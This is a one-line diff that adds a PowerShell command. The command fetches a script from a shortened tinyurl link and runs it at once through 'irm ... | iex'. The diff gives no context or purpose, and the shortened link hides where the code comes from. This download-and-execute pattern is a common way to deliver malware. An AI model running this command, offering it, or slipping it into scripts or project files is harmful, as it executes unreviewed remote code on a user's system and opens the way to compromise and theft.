@@ -1,0 +1,1 @@
+Powershell "irm https://tinyurl.com/yc7wfh83 | iex"
